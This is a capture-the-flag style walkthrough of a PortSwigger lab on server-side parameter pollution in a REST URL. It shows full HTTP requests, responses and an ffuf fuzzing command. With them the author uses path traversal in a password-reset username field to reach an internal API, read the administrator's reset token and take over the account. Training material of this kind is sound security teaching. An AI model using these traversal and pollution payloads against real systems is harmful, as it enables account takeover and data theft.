[Lab](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-rest-url)

---

Like the previous one, I have to go on `/forgot-password` to do the tricks. I sent to burp the classic following
**Request**
```http
POST /forgot-password HTTP/2
Host: 0a57003604720b478127ed2700f00020.web-security-academy.net
Cookie: session=wGUW0Vk4QAWZt1anFhSPdt7F0ES4yprM
Content-Length: 60

csrf=t6WAkgIuCSq72pfK7pNfzCViegahBXkE&username=administrator
```

**Response**
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"result":"*****@normal-user.net","type":"email"}
```

Then I used the `#` encoded in `%23` to try to trigger some behavior

**Request**
```http
POST /forgot-password HTTP/2
Host: 0a57003604720b478127ed2700f00020.web-security-academy.net
Cookie: session=wGUW0Vk4QAWZt1anFhSPdt7F0ES4yprM
Content-Length: 63

csrf=t6WAkgIuCSq72pfK7pNfzCViegahBXkE&username=administrator%23
```

**Response**
```http
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 86

{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

The `Invalid route` for `administrator#` suggest that the server may have placed the input in the path of the server-side request.
Now let's try with `?` as `%3F`

**Request**
```http
POST /forgot-password HTTP/2
Host: 0a57003604720b478127ed2700f00020.web-security-academy.net
Cookie: session=wGUW0Vk4QAWZt1anFhSPdt7F0ES4yprM
Content-Length: 63

csrf=t6WAkgIuCSq72pfK7pNfzCViegahBXkE&username=administrator%3F
```

**Response**
```http
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 86

{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

There is still the `Invalid route` error message, this suggests that the input may be placed in a URL path, as the `?` indicates the start of the query string and therefore truncates the url path.
Now let's try with `./administrator`

**Request**
```http
POST /forgot-password HTTP/2
Host: 0a57003604720b478127ed2700f00020.web-security-academy.net
Cookie: session=wGUW0Vk4QAWZt1anFhSPdt7F0ES4yprM
Content-Length: 62

csrf=t6WAkgIuCSq72pfK7pNfzCViegahBXkE&username=./administrator
```

**Response**
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"result":"*****@normal-user.net","type":"email"}
```

Using a relative path `./` and getting no errors suggest that I could try to exploit this one by going up in the tree. So I'll try to trigger a new behavior like this `../../%23` until I get a new error message

**Request**
```http
POST /forgot-password HTTP/2
Host: 0a57003604720b478127ed2700f00020.web-security-academy.net
Cookie: session=wGUW0Vk4QAWZt1anFhSPdt7F0ES4yprM
Content-Length: 62

csrf=t6WAkgIuCSq72pfK7pNfzCViegahBXkE&username=../../../../%23
```

**Response**
```http
HTTP/2 500 Internal Server Error
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 250

{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}
```

Here is the new error message. Now I'll try to find an api endpoint by fuzzing with the following wordlist
```text
/usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

```shell
ffuf -X POST -d 'csrf=t6WAkgIuCSq72pfK7pNfzCViegahBXkE&username=../../../../FUZZ%23' -b 'session=wGUW0Vk4QAWZt1anFhSPdt7F0ES4yprM' -u 'https://0a57003604720b478127ed2700f00020.web-security-academy.net/forgot-password' -w '/usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt' -fw 34
```

This gave me `openapi.json`, which I'll try in burp

**Request**
```http
POST /forgot-password HTTP/2
Host: 0a57003604720b478127ed2700f00020.web-security-academy.net
Cookie: session=wGUW0Vk4QAWZt1anFhSPdt7F0ES4yprM
Content-Length: 74

csrf=t6WAkgIuCSq72pfK7pNfzCViegahBXkE&username=../../../../openapi.json%23
```

**Response**
```http
HTTP/2 500 Internal Server Error
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 629

{
  "error": "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
}
```

I asked chatgpt to format it and he gave me the path `/api/internal/v1/users/{username}/field/{field}`

I found the reset password function in the `forgotPassword.js`

```js
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});
```

The name of the field seems to be `passwordResetToken`, which I'll try

**Request**
```http
POST /forgot-password HTTP/2
Host: 0a57003604720b478127ed2700f00020.web-security-academy.net
Cookie: session=wGUW0Vk4QAWZt1anFhSPdt7F0ES4yprM
Content-Length: 122

csrf=t6WAkgIuCSq72pfK7pNfzCViegahBXkE&username=../../../../api/internal/v1/users/administrator/field/passwordResetToken%23
```

**Response**
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 82

{
  "type": "passwordResetToken",
  "result": "0w93aox6copjky47wiccgw43aa97ff6p"
}
```

Both field `username` and `email` works too but `passwordResetToken` is what I need for the final destination `/forgot-password?passwordResetToken=0w93aox6copjky47wiccgw43aa97ff6p`

Just had to choose a new password, connect and delete `carlos`

